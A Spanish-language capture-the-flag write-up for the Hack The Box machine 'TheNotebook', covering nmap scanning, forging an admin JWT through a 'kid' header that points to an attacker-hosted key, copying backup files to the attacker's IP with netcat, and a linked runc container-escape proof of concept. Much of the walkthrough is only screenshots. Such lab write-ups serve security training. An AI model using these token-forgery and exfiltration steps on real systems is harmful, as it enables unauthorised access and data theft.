---
description: 'https://www.hackthebox.eu/home/machines/profile/320'
---

# TheNotebook



![](../../.gitbook/assets/0%20%287%29.png)

## Enumeración

Realizamos un escaneo con nmap para saber los puertos abiertos en el rango de 1-65536 puertos.

```text
# Nmap 7.91 scan initiated Sat Mar  6 13:00:17 2021 as: nmap -p- --open -n -T5 -v -oG allPorts 10.129.83.187
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.83.187 ()	Status: Up
Host: 10.129.83.187 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Sat Mar  6 13:00:43 2021 -- 1 IP address (1 host up) scanned in 26.26 seconds
```

| Bandera | Descripción |
| :--- | :--- |
| -p- | Escaneo a los 65536 puertos |
| --open | Reporta solo los puertos con estado "open". |
| -T5 | Exploracion a velocidades insanas \(lo hago porque es un entorno de pruebas\). |
| -v | Muestra más información sobre el sondeo que se está realizando. |
| -oG allPorts | Exporta los resultados en un formato Grepable con el nombre de allPorts. |

Posteriormente verificamos la versión de los servicios en los puertos abiertos y lanzamos los scripts por defecto.

```text
# Nmap 7.91 scan initiated Sat Mar  6 13:02:13 2021 as: nmap -sCV -p22,80 -oN targeted 10.129.83.187
Nmap scan report for 10.129.83.187
Host is up (0.074s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  6 13:02:23 2021 -- 1 IP address (1 host up) scanned in 10.13 seconds
```

| Bandera | Descripción |
| :--- | :--- |
| -p22,80 | Escaneo a los puertos 22 y 80. |
| -sC | Escanea con los scripts por defecto. |
| -sV | Intenta determinar la versión del servicio que se ejecuta en el puerto. |
| -oN | Exporta los resultados en un formato nmap. |

qwerty

qwerty1234

qwerty@thenotebook.htb

![](../../.gitbook/assets/1.png)

base 64

![](../../.gitbook/assets/2%20%289%29.png)

Jwt

https://jwt.io/

![](../../.gitbook/assets/3%20%2811%29.png)

[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}

{"typ":"JWT","alg":"RS256","kid":"http://10.10.15.101:7070/jwtRS256.key"}

{"username":"qwerty","email":"qwerty@thenotebook.htb","admin\_cap":false}

{"username":"admin","email":"admin@thenotebook.htb","admin\_cap":true}

ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key  
openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub

cat jwtRS256.key

cat jwtRS256.key.pub

![](../../.gitbook/assets/4%20%285%29.png)

![](../../.gitbook/assets/5%20%287%29.png)

![](../../.gitbook/assets/6%20%287%29.png)

![](../../.gitbook/assets/7%20%286%29.png)

![](../../.gitbook/assets/8%20%2811%29.png)

![](../../.gitbook/assets/9%20%2810%29.png)

Al dar click en admin panel debemos de volver a poner nuestro token de nuevo

![](../../.gitbook/assets/10%20%288%29.png)

![](../../.gitbook/assets/11%20%287%29.png)

![](../../.gitbook/assets/12%20%284%29.png)

![](../../.gitbook/assets/13%20%284%29.png)

Recordando que hablan de unos respaldos

En /vat/backups, se encuentran los siguientes archivos

apt.extended\_states.0

apt.extended\_states.1.gz

apt.extended\_states.2.gz

home.tar.gz

Los transferi a mi maquina

nc -l -p 5000 &gt;apt.extended\_states.0

nc -w 3 10.10.15.101 5000 &lt; apt.extended\_states.0

![](../../.gitbook/assets/14%20%288%29.png)

Probamos la llave y la conexión fue exitosa.

![](../../.gitbook/assets/15%20%287%29.png)

![](../../.gitbook/assets/16%20%286%29.png)

[https://github.com/feexd/pocs/tree/master/CVE-2019-5736](https://github.com/feexd/pocs/tree/master/CVE-2019-5736)

![](../../.gitbook/assets/17%20%284%29.png)

